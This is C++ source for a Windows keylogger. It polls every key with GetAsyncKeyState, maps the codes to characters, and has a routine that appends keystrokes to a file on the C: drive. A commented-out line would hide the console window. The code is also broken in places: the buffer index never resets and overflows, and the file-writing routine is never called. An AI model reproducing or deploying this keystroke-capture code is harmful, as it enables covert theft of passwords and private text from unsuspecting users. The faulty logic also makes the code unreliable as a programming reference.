#include <windows.h>
#include <iostream>
#include <fstream>
#include <list>
#include <thread>

using namespace std;

const int RECORD_LENGTH = 16;

string convertkey(int key){
    string keystring;
    switch(key)
      {
      case 8 :
           keystring = "[/]";
           break;
      case 13 :
           keystring = "\n";
           break;
      case 32 :
           keystring = " ";
           break;
      case 190 :
           keystring = ".";
           break;
      case 110 :
           keystring = ".";
           break;
      case VK_CAPITAL :
           keystring = "[CAPS LOCK]";
           break;
      case VK_TAB :
           keystring = "[TAB]";
           break;
      case VK_CONTROL :
           keystring = "[CONTROL]";
           break;
      case VK_ESCAPE :
           keystring = "[ESCAPE]";
           break;
      case VK_DOWN :
           keystring = "[DOWN]";
           break;
      case VK_LEFT :
           keystring = "[LEFT]";
           break;
      case VK_RIGHT :
           keystring = "[RIGHT]";
           break;
      case VK_UP :
           keystring = "[UP]";
           break;
      }
      if(key >= 96 && key <= 105)
             keystring = key-48;
      else if (key > 47 && key < 60)
             keystring = key;
      if (key != VK_LBUTTON || key != VK_RBUTTON)
        {
            if (key > 64 && key < 91)
            {
                if (GetKeyState(VK_CAPITAL) | GetAsyncKeyState(VK_SHIFT)) 
                    keystring = key;                                   //if its capital then stay                               
                else 
                {
                    key = key + 32;                     //if not shift the number to the lowercase value                                     
                    keystring = key;
                }
            }
        }
        return keystring;
}

void StoreKey(string key){
   ofstream storekey("C:\\storekey.txt", ios::app);
   storekey << key;
   cout << key;
   storekey.close();
}

void printAll(int records[RECORD_LENGTH]) {
    for (int i = 0; i < RECORD_LENGTH; i++) {
        std::cout << records[i];
        Sleep(500);
    }
    //while (true)
    //{
    //    std::cout << records << std::endl;
    //    std::cin.get();
    //}
}

void snif(int records[RECORD_LENGTH])
{
     
    int key, i=0;

     while(true)
     {
          Sleep(5);
          for(key = 8; key <= 256; key++)
          {
               if(GetAsyncKeyState(key)&1 == 1)                                                           
               {
                   records[i] = key;
                   i++;
                   cout << key << endl;
                   if (i == RECORD_LENGTH - 1) {
                       std::thread printer(printAll, records);
                       printer.join();
                   }
               }
          }
     }
}

int main() {

    // ShowWindow(::GetConsoleWindow(), SW_HIDE);
    int records[RECORD_LENGTH];

    std::thread sniffer(snif, records);

    sniffer.join();

    //std::cout << ptr << std::endl;
    //std::cin.get();


    return 0;
}